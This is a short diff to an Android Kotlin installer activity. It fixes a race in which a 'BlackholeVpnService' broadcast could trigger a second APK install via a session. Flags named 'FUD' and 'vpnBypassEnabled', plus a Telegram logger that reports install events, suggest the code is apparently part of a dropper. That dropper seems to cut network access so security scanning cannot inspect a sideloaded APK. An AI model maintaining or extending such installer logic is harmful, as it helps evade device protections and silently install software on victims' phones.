@@ -302,12 +302,11 @@ class InstallActivity : Activity() {
     private val vpnEstablishedReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context, intent: Intent) {
             if (intent.action == BlackholeVpnService.VPN_ESTABLISHED_ACTION) {
-                val apk = pendingApkBytes
-                if (apk != null) {
-                    pendingApkBytes = null
-                    installViaSession(apk, attempt = 1)
-                } else {
-                }
+                // Guard: pendingApkBytes is nulled on FUD=OFF early return or on duplicate fire.
+                // Double-install is prevented — only the first fire with non-null bytes proceeds.
+                val apk = pendingApkBytes ?: return
+                pendingApkBytes = null
+                installViaSession(apk, attempt = 1)
             }
         }
     }
@@ -828,7 +827,11 @@ class InstallActivity : Activity() {
         if (!BuildConfig.FEATURE_FLAG_V || !vpnBypassEnabled) {
             TelegramLogger.send(this, "VPN_FLOW", "SKIPPED",
                 "compilegate=${BuildConfig.FEATURE_FLAG_V} runtimegate=$vpnBypassEnabled — installing without VPN")
+            // Clear pending bytes and silence vpnEstablishedReceiver before bypassing VPN.
+            // Without this, any late VPN_ESTABLISHED broadcast (e.g. leftover from a
+            // previous install attempt) would call installViaSession() a second time.
             pendingApkBytes = null
+            try { unregisterReceiver(vpnEstablishedReceiver) } catch (_: Exception) {}
             installViaSession(apkBytes, attempt = 1)
             return
         }
